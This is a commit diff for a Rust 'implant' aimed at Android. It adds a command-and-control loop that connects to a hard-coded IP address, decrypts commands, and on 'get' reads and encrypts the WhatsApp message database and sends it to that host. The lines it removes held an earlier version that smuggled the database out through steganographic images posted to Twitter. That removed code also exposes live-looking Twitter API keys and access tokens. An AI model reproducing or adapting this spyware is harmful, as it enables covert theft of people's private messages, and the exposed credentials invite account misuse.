adb51d5852455e4415938e7bf7a9549c586d7512
Connor Reardon <connor@Connors-MacBook-Pro.local>
2020-05-02 17:11:13 -0400

    Updated implant

--- implant/src/main.rs
+++ implant/src/main.rs
@@ -1,37 +1,22 @@
-extern crate egg_mode;
 extern crate hex;
 #[macro_use] extern crate log;
-
-mod encoder;
-mod errors;
-mod utils;
-
-use egg_mode::media::{media_types, upload_media};
 /*
    use android_logger::Config;
    use log::Level;
    */
-use egg_mode::tweet::DraftTweet;
-use encoder::Encoder;
-use errors::Error;
-use math::round;
-use reqwest;
 use std::env;
 use std::fs;
 use std::fs::File;
 use std::io::prelude::*;
-use std::path::PathBuf;
 use std::string::ToString;
-use std::{thread, time};
-use tokio;
-use utils::ByteMask;
+//use std::{thread, time};
 use nix::unistd::*;
 use std::net::TcpStream;
-use openssl::aes::{AesKey, KeyError, aes_ige};
-use openssl::symm::{encrypt, Cipher, Crypter};
+//use openssl::aes::{AesKey, KeyError, aes_ige};
+use openssl::symm::{Cipher, Crypter};
 use openssl::symm::Mode;
 use openssl::error::ErrorStack;
-use hex::{FromHex, ToHex};
+use hex::{FromHex};
 
 static WORKING_DIRECTORY: &str = "toast";
 
@@ -49,7 +34,22 @@ fn decrypt(t: Cipher,
     Ok(out)
 }
 
-fn main() -> Result<(), Error> {
+fn encrypt(t: Cipher,
+        key: &[u8],
+        iv: Option<&[u8]>,
+        data: &[u8],
+        ) -> Result<Vec<u8>, ErrorStack> {
+    let mut c = Crypter::new(t, Mode::Encrypt, key, iv)?;
+    c.pad(false);
+    let mut out = vec![0; data.len() + t.block_size()];
+    let count = c.update(data, &mut out)?;
+    let rest = c.finalize(&mut out[count..])?;
+    out.truncate(count + rest);
+    Ok(out)
+}
+
+#[allow(unused_must_use)]
+fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     /*
        android_logger::init_once(
@@ -58,64 +58,36 @@ fn main() -> Result<(), Error> {
        .with_tag("TOAST") // logs will show under mytag tag
        );
        */
-
-
-
-    /*
-       match setup() {
+    let mut stream = TcpStream::connect("3.215.107.66:443")?;
+    match setup() {
        Ok(()) => info!("No error from setup"),
        Err(e) => error!("Error in setup: {}", e),
-       };
-       */
-    get_commands().unwrap();
-    /*
-       match start() {
-       Ok(()) => info!("No error from start"), 
-       Err(e) => error!("start: {}", e),
-       };
-
-    //let path = env::current_dir()?;
-    match pull_tweets() {
-    Ok(()) => info!("No error from pull_tweets"), 
-    Err(e) => error!("pull_tweets: {}", e),
     };
 
-    match steal_db() {
-    Ok(()) => info!("No error from steal_db"),
-    Err(e) => error!("steal_db: {}", e),
-    };
-
-    match send_tweet() { 
-    Ok(()) => info!("No error from send_tweet"),
-    Err(e) => error!("send_tweet: {}", e),
-    };
-
-    match kill() {
-    Ok(()) => info!("No error from kill"),
-    Err(e) => error!("kill: {}", e),
-    };
-    */
+    loop {    
+        let res = get_commands(&mut stream).unwrap();
+        let trimmed = res.trim();
+        if trimmed == "get" {
+            let encrypted_db = steal_db().unwrap();
+            stream.write_all(&encrypted_db);
+        }
+        if trimmed == "kill" {
+            match kill() {
+                Ok(()) => info!("No error from kill"),
+                Err(e) => error!("kill: {}", e),
+            };
+            break;
+        }
+    }
     Ok(())
 }
 
-fn get_commands() -> Result<(), Box<dyn std::error::Error>>{
-
-    let data = b"get0000000000000\x00";
-
-
-    let mut stream = TcpStream::connect("3.215.107.66:443")?;
-
+fn get_commands(stream:  &mut std::net::TcpStream) -> Result<String, Box<dyn std::error::Error>> {
     let mut buffer = [0; 32];
-
-    let len = stream.read(&mut buffer)?;
-
+    let _len = &stream.read(&mut buffer)?;
     let key = Vec::from_hex("546869732069732061206b6579313233")?;
-    let mut iv = Vec::from_hex("5468697320697320616e204956343536")?;
-
+    let iv = Vec::from_hex("5468697320697320616e204956343536")?;
     let cipher = Cipher::aes_128_cbc();
-    
-    let mut output = vec![0u8; len];
-
 
     let command = match decrypt(
         cipher,
@@ -126,56 +98,20 @@ fn get_commands() -> Result<(), Box<dyn std::error::Error>>{
         Err(e) => panic!("{}", e),
     };
 
-    println!("{:?}" , std::str::from_utf8(&command).unwrap());
-    Ok(())
-
-}
-
-#[tokio::main]
-async fn start() -> Result<(), Box<dyn std::error::Error>> {
-    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
-    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
-    let token = egg_mode::Token::Access {
-        consumer: con_token,
-        access: access_token,
-    };
-    let user_id = "ToastDisciples";
-    let mut end = false;
-    let five_secs = time::Duration::from_millis(5000);
-    loop {
-        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
-        let (_user, feed) = user.start().await?;
-
-        for status in feed.iter() {
-            if status.text.contains("We are hungry") {
-                end = true;
-                break;
-            }
-        }
-
-        if end == true {
-            break;
-        }
-
-        thread::sleep(five_secs);
-    }
-    Ok(())
+    let res = std::str::from_utf8(&command).unwrap();
+    println!("{:?}" , res);
+    Ok(res.to_string())
 }
 
 fn setup() -> Result<(), Box<dyn std::error::Error>> {
-
     match fork()? {                                                                                               
         ForkResult::Parent{ child: _ } => {
             std::process::exit(0);
         }
         ForkResult::Child => {}
     };  
-
     setsid()?;
-
     env::set_current_dir("/data")?;
-
-
     match env::args().next() {
         Some(arg) => {
             info!("Argument: {}", &arg);
@@ -186,160 +122,31 @@ fn setup() -> Result<(), Box<dyn std::error::Error>> {
             fs::remove_file("/data/pprt")?;
         },
     };
-
     fs::create_dir(WORKING_DIRECTORY)?;
     env::set_current_dir(WORKING_DIRECTORY)?;
-
     Ok(())
 }
 
-fn kill() -> Result<(), Error> {
+fn kill() -> Result<(), Box<dyn std::error::Error>> {
     env::set_current_dir("..")?;
     fs::remove_dir_all(WORKING_DIRECTORY)?;
     Ok(())
 }
 
-fn steal_db() -> Result<(), Error> {
-    let mask = ByteMask::new(2)?;
-    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
-
-    //let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
-    let mut buffer = Vec::new();
-    let mut file_size:u32 = 0;
-    db.read_to_end(&mut buffer)?;
-    info!("Read db to end");
-    let x = &buffer;
-
-    let mut iterator = x.iter();
-    while iterator.next() != None {
-        file_size+=1;
-    }
-
-    info!("Database size: {}", &file_size);
-    let image_meta = fs::metadata("image_0.jpg")?;
-    let image_size = image_meta.len();
-
-    info!("Image size: {}", image_size);
-
-    let image_size_float = image_size as f64;
-    let number_of_pictures = f64::from(file_size) / image_size_float;
-    let rounded = round::ceil(number_of_pictures, 0) as u32;
-    let mut i:u32 = 0;
-
-    while i < rounded {
-        info!("ENCODING {}", i);
-        let jpg = format!("image_0.jpg");
-        let png = format!("image_{}encoded.png", i);
-        let f = fs::read("/data/data/com.whatsapp/databases/msgstore.db")?;
-        let mut iter = f.chunks(image_size as usize);
-        let mut count:u32 = 0;
-        while count < i {
-            iter.next();
-            count += 1;
-        }
-        let to_write = iter.next().unwrap();
-        let file_name = format!("chunk_{}", i);
-        let mut file = File::create(&file_name)?;
-        file.write_all(&to_write)?;
-
-        info!("encoding {} into {} as {}", &file_name, &jpg, &png);
-        encode(PathBuf::from(&jpg), PathBuf::from(&file_name), PathBuf::from(&png), mask)?;
-        i+=1;
-    }
-    Ok(())
-}
-
-#[tokio::main]
-async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
-    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
-    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
-    let token = egg_mode::Token::Access {
-        consumer: con_token,
-        access: access_token,
-    };
-
+fn steal_db() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
     let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
     let mut buffer = Vec::new();
-    let mut file_size:u32 = 0;
     db.read_to_end(&mut buffer)?;
-    let x = &buffer;
-    let mut iterator = x.iter();
-    while iterator.next() != None {
-        file_size+=1;
-    }
-    let image_meta = fs::metadata("image_0.jpg")?;
-    let image_size = image_meta.len();
-    let image_size_float = image_size as f64;
-    let number_of_pictures = f64::from(file_size) / image_size_float;
-    let rounded = round::ceil(number_of_pictures, 0) as u32;
-
-    let mut i:u32 = 0;
-    while i < rounded {
-        let mut tweet = DraftTweet::new(format!("The toast is burnt {}", i));
-        let typ = media_types::image_png();
-        let image = PathBuf::from(&format!("image_{}encoded.png", i));
-        let bytes = std::fs::read(image)?;
-        let handle = upload_media(&bytes, &typ, &token).await?;
-        tweet.add_media(handle.id.clone());
-        info!("ADDED {}", i);
-        tweet.send(&token).await?;
-        info!("TWEETED {}", i);
-        i = i + 1;
-    }
-    Ok(())
-}
-
-#[tokio::main]
-async fn pull_tweets() -> Result<(), Box<dyn std::error::Error>> {
-    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
-    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
-    let token = egg_mode::Token::Access {
-        consumer: con_token,
-        access: access_token,
+    let key = Vec::from_hex("546869732069732061206b6579313233")?;
+    let iv = Vec::from_hex("5468697320697320616e204956343536")?;
+    let cipher = Cipher::aes_128_cbc();
+    let encrypted_db = match encrypt(
+        cipher,
+        &key,
+        Some(&iv),
+        &buffer) {
+        Ok(c) => c,
+        Err(e) => panic!("{}", e),
     };
-    let user_id = "ToastDisciples";
-    let mut end = false;
-    let ten_secs = time::Duration::from_millis(5000);
-    loop {
-        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
-        let (_user, feed) = user.start().await?;
-        let mut i:u32 = 0;
-        for status in feed.iter() {
-            if status.text.contains("We ate the toast") {
-                end = true;
-                break;
-            }
-            if let Some(ref media) = status.extended_entities{
-                if status.text.contains("Burn the toast"){
-                    for info in &media.media {
-                        info!("URL: {} {}", info.media_url, i);
-                        let res = reqwest::get(&(info.media_url).to_string()).await?.bytes().await?;
-                        let file_name = format!("image_{}.jpg", i);
-                        let mut file = File::create(file_name)?;
-                        file.write_all(&res)?;
-                        i = i + 1;
-                    }
-                }
-            }
-        }
-        if end == true {
-            break;
-        }
-        thread::sleep(ten_secs);
-    }
-
-    Ok(())
+    Ok(encrypted_db)
 }
-
-fn encode(image: PathBuf, secret: PathBuf, output: PathBuf, mask: ByteMask) -> Result<(), Error> {
-    let mut encoder = match Encoder::new(image, secret, mask) {
-        Ok(encoder) => encoder,
-        Err(e) => { 
-            error!("Error Encoder::new: {}", e);
-            panic!("{}",e);
-        },
-    };
-    encoder.save(output)?;
-    Ok(())
-}
-
